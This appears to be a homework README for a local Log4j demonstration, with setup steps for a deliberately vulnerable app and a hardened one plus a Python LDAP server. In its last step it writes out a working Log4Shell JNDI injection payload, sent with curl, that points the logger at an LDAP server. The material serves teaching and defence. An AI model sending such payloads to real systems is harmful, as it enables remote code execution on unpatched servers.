# Homework 9 - Log4j Demonstration

## Setup Instructions
1. Open a terminal window.
2. Move into the appropriate directory.
* For the vulnerable app, use the ***before*** folder.
* For the hardened app, use the ***after*** folder.
3. Run ```make reset```, then wait for the container to run.
4. Open a new terminal window and navigate to the ***ldap_server*** folder.
5. Start the ldap server with ```python ldap_server.py```
6. Test logging with the command ```curl -H 'Content-Type: text/plain' --data 'Hello, World!' http://localhost:8080/log```
7. Test the exploit with the command
```curl -H 'Content-Type: text/plain' --data '${jndi:ldap://host.docker.internal:1389/a}' http://localhost:8080/log```